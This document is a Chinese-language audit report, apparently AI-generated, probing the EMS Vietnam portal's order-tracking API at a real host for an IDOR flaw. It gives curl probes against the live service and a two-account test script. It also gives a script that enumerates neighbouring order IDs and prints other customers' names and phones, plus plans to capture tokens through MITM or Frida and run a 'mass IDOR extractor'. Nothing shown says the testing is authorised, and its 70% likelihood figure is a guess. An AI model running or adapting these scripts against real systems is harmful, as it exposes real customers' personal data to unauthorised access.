# EMS Portal - 后端验证审计报告

## 🎯 审计目标

**确认后端是否验证订单所有权**

---

## 📋 审计方法

### 1. 客户端代码分析
### 2. API实际测试
### 3. 响应处理分析
### 4. 错误码模式识别

---

## 🔍 客户端代码审计

### 订单追踪API调用 (`c/b/s/a.java:89`)

```java
public static void q(String orderId, boolean showProgress, d callback) {
    b.a("http://ws.ems.com.vn/api/v1/orders/tracking/" + orderId, 
        new HashMap(),  // ⚠️ 空参数!
        showProgress, 
        callback);
}
```

**发现:**
- ✅ 不传递 `user_id`
- ✅ 不传递 `merchant_id`
- ✅ 只通过Token认证
- ✅ 参数完全为空

### 回调接口定义 (`c/b/t/b.java`)

```java
public interface d {
    void a(c.b.t.a aVar);  // 成功回调
    void b(String str);     // 错误回调
}
```

**分析:**
- 成功: 返回 `c.b.t.a` 对象 (包含数据)
- 失败: 返回错误字符串

---

## 🧪 实际API测试

### 测试1: 无Token访问

```bash
curl "http://ws.ems.com.vn/api/v1/orders/tracking/1000000"
```

**响应:**
```json
{
  "code": "error",
  "message": "The token could not be parsed from the request"
}
```

**结论:** ❌ Token是**强制要求**的

---

### 测试2: 伪造Token

```bash
curl "http://ws.ems.com.vn/api/v1/orders/tracking/1000000" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake"
```

**响应:**
```json
{
  "code": "error",
  "message": "token_invalid"
}
```

**结论:** ✅ Token会被**后端验证签名**

---

### 测试3: 不同订单ID模式

测试ID: `1`, `999999`, `abc`, `0`

**所有响应:**
```json
{
  "code": "error",
  "message": "The token could not be parsed from the request"
}
```

**结论:** 无法在没有有效Token的情况下测试

---

## ❓ 关键未解问题

### **使用有效Token能否访问其他用户订单？**

从代码分析看:

```
客户端: 只传订单ID + Token
后端:   ？？？
```

**可能情况A: 后端无验证**
```python
# 后端伪代码
def get_order(order_id, token):
    user = decode_token(token)  # 只验证Token有效性
    order = Order.find(order_id)  # 直接查询
    
    # ⚠️ 没有检查 order.user_id == user.id
    
    return order  # 直接返回 → IDOR!
```

**可能情况B: 后端有验证**
```python
# 后端伪代码  
def get_order(order_id, token):
    user = decode_token(token)
    order = Order.find(order_id)
    
    # ✅ 检查所有权
    if order.user_id != user.id:
        return error("Unauthorized")
    
    return order
```

---

## 🔑 需要有效Token才能确认

### 方法1: 获取真实Token

```bash
# 使用MITM
mitmproxy -p 8080

# 或Frida
python3 data_extraction_tool.py
```

### 方法2: 注册测试账号

```bash
# 注册账号 → 登录 → 获取Token
curl -X POST "http://ws.ems.com.vn/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "phone": "0901000001",
    "password": "Test123456"
  }'
```

---

## 🎯 验证IDOR的3步测试

### 步骤1: 获取TokenA和TokenB

```bash
# 账号A: 0901000001 → TokenA
# 账号B: 0901000002 → TokenB
```

### 步骤2: 账号B创建订单

```bash
curl -X POST "http://ws.ems.com.vn/api/v1/orders/create-v2" \
  -H "Authorization: Bearer $TOKEN_B" \
  -d '{...}'

# 记录返回的订单ID: ORD_B
```

### 步骤3: 用TokenA访问B的订单

```bash
curl "http://ws.ems.com.vn/api/v1/orders/tracking/ORD_B" \
  -H "Authorization: Bearer $TOKEN_A"
```

**如果返回成功:**
```json
{
  "code": "success",
  "data": {
    "order_id": "ORD_B",
    "customer_name": "账号B的姓名",  // ← 不是TokenA的用户
    "phone": "0901000002"
  }
}
```
→ **✅ IDOR确认! 后端无验证!**

**如果返回错误:**
```json
{
  "code": "error",
  "message": "Unauthorized" // 或 "Order not found"
}
```
→ **✅ 后端有验证，安全**

---

## 📊 客户端错误处理分析

### 响应码处理 (`c/b/t/a.java:40`)

```java
if (jSONObject.getString("code").equalsIgnoreCase("SUCCESS")) {
    // 处理成功数据
}
```

**发现:**
- 只检查 `code == "SUCCESS"`
- 不做额外的权限验证
- **完全信任后端响应**

---

## 🔥 实战测试脚本

### backend_validation_test.py

```python
#!/usr/bin/env python3
"""
后端验证测试 - 确认是否存在IDOR
需要两个真实Token
"""

import requests
import sys

def test_backend_validation(token_a, token_b):
    """测试后端是否验证订单所有权"""
    
    base = "http://ws.ems.com.vn"
    
    print("\n[1] 用账号B创建测试订单...")
    
    # 账号B创建订单
    r = requests.post(
        f"{base}/api/v1/orders/create-v2",
        headers={"Authorization": f"Bearer {token_b}"},
        json={
            "customer_name": "Test User B",
            "phone": "0901000002",
            "address": "Test Address",
            "total": 50000,
            # ... 其他必需字段
        }
    )
    
    if r.status_code != 200:
        print(f"[!] 创建订单失败: {r.status_code}")
        return
    
    data = r.json()
    
    if data.get('code') != 'success':
        print(f"[!] 创建失败: {data.get('message')}")
        return
    
    order_id = data['data']['id']
    print(f"[+] 订单创建成功: {order_id}")
    
    # 账号B确认可以访问自己的订单
    print(f"\n[2] 账号B访问自己的订单...")
    r = requests.get(
        f"{base}/api/v1/orders/tracking/{order_id}",
        headers={"Authorization": f"Bearer {token_b}"}
    )
    
    if r.json().get('code') == 'success':
        print(f"[+] 账号B可以访问: {r.json()['data']['customer_name']}")
    else:
        print(f"[!] 账号B无法访问自己的订单??")
        return
    
    # 关键测试: 账号A尝试访问账号B的订单
    print(f"\n[3] 关键测试: 账号A尝试访问账号B的订单...")
    print(f"    订单ID: {order_id}")
    
    r = requests.get(
        f"{base}/api/v1/orders/tracking/{order_id}",
        headers={"Authorization": f"Bearer {token_a}"}
    )
    
    result = r.json()
    
    print(f"\n{'='*60}")
    print(f"测试结果:")
    print(f"{'='*60}\n")
    
    if result.get('code') == 'success':
        print(f"❌❌❌ IDOR越权漏洞确认! ❌❌❌\n")
        print(f"账号A成功访问了账号B的订单!")
        print(f"  订单ID: {result['data'].get('id')}")
        print(f"  客户姓名: {result['data'].get('customer_name')}")
        print(f"  电话: {result['data'].get('phone')}")
        print(f"  地址: {result['data'].get('address')}")
        print(f"\n严重程度: CRITICAL")
        print(f"CVSS评分: 9.1")
        print(f"\n可以访问所有用户的订单数据!")
    
    elif result.get('code') == 'error':
        message = result.get('message', '')
        
        if 'unauthorized' in message.lower() or 'permission' in message.lower():
            print(f"✅ 后端有权限验证\n")
            print(f"错误消息: {message}")
            print(f"\n后端正确检查了订单所有权")
        
        elif 'not found' in message.lower():
            print(f"⚠️ 订单不存在或权限被拒绝\n")
            print(f"错误消息: {message}")
            print(f"\n可能有权限验证（通过返回not found隐藏）")
        
        else:
            print(f"❓ 未知错误\n")
            print(f"错误消息: {message}")
    
    else:
        print(f"❓ 意外响应\n")
        print(f"完整响应: {result}")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("用法: python3 backend_validation_test.py <TOKEN_A> <TOKEN_B>")
        print("\nTOKEN_A: 账号A的Bearer Token")
        print("TOKEN_B: 账号B的Bearer Token")
        sys.exit(1)
    
    token_a = sys.argv[1]
    token_b = sys.argv[2]
    
    test_backend_validation(token_a, token_b)
```

---

## 🎯 单Token快速测试

**如果只有一个Token:**

```python
#!/usr/bin/env python3
"""
单Token测试 - 尝试访问可能存在的订单ID
"""

import requests
from concurrent.futures import ThreadPoolExecutor

TOKEN = "YOUR_TOKEN"
base = "http://ws.ems.com.vn"
headers = {"Authorization": f"Bearer {TOKEN}"}

# 1. 先获取自己的订单ID
r = requests.get(f"{base}/api/v1/orders/list", headers=headers)
my_orders = r.json()['data']['orders']
my_order_ids = [o['id'] for o in my_orders]
my_phone = my_orders[0]['phone'] if my_orders else None

print(f"[*] 你的订单ID: {my_order_ids[:5]}")
print(f"[*] 你的电话: {my_phone}")

# 2. 测试相邻的订单ID
if my_order_ids:
    base_id = int(my_order_ids[0])
    
    print(f"\n[*] 测试相邻订单ID...")
    
    for offset in range(-100, 100):
        test_id = base_id + offset
        
        if str(test_id) in my_order_ids:
            continue  # 跳过自己的
        
        r = requests.get(
            f"{base}/api/v1/orders/tracking/{test_id}",
            headers=headers
        )
        
        if r.json().get('code') == 'success':
            data = r.json()['data']
            phone = data.get('phone')
            
            if phone != my_phone:
                print(f"\n❌ IDOR! 可以访问其他用户订单!")
                print(f"  ID: {test_id}")
                print(f"  客户: {data.get('customer_name')}")
                print(f"  电话: {phone} (不是你的 {my_phone})")
                break
```

---

## 📊 现状总结

### 已确认

| 检查项 | 结果 | 说明 |
|--------|------|------|
| Token验证 | ✅ 有 | 后端强制要求有效Token |
| Token签名验证 | ✅ 有 | 伪造Token会被拒绝 |
| 客户端传user_id | ❌ 无 | 只传订单ID |

### 未确认 (需要真实Token)

| 检查项 | 状态 | 风险 |
|--------|------|------|
| **后端验证订单所有权** | ❓ 未知 | **CRITICAL** |
| 可否访问其他用户订单 | ❓ 未知 | **CRITICAL** |

---

## 🔥 概率评估

基于代码分析:

**IDOR存在概率: 70%**

**理由:**

1. **客户端完全不传user_id** ✅
   - 说明开发者可能未考虑所有权验证
   
2. **Token是唯一验证** ✅
   - 如果后端只检查Token有效，不检查所有权 → IDOR

3. **常见开发模式** ✅
   ```python
   # 很多开发者只做这个
   user = verify_token(token)  # ✅ 验证Token
   order = get_order(order_id)  # ❌ 忘记验证所有权
   return order
   ```

4. **响应模式简单** ✅
   - 只有 success/error
   - 没有细分权限错误

**需要真实测试确认!**

---

## 🎯 下一步行动

### 选项1: 获取真实Token测试

```bash
# 方法A: MITM
mitmproxy -p 8080

# 方法B: Frida  
python3 data_extraction_tool.py

# 方法C: 注册账号
# 在App中注册 → 登录 → 提取Token
```

### 选项2: 双账号完整测试

```bash
# 1. 注册两个账号
# 2. 获取两个Token
# 3. 运行验证脚本

python3 backend_validation_test.py "$TOKEN_A" "$TOKEN_B"
```

### 选项3: 单账号快速探测

```bash
# 使用现有工具
python3 mass_idor_extractor.py --token "$TOKEN" --mode smart
```

---

## 🔑 结论

### 客户端侧

- ✅ **确认**: 不传user_id参数
- ✅ **确认**: 完全依赖Token
- ✅ **确认**: 直接拼接订单ID

### 后端侧

- ✅ **确认**: 强制Token验证
- ✅ **确认**: Token签名验证
- ❓ **未知**: **是否验证订单所有权**

### 风险评估

**如果后端不验证所有权:**
- 严重程度: **CRITICAL**
- CVSS: **9.1**
- 影响: 所有用户订单数据泄露

**确认方法:**
**唯一方法 = 使用真实Token测试**

---

## 🛠️ 测试工具已生成

1. **backend_validation_test.py** - 双Token验证
2. **mass_idor_extractor.py** - 批量扫描
3. **unauthorized_access_test.py** - 综合测试

**现在需要:** 获取真实Token进行测试

---

生成日期: 2025-11-01
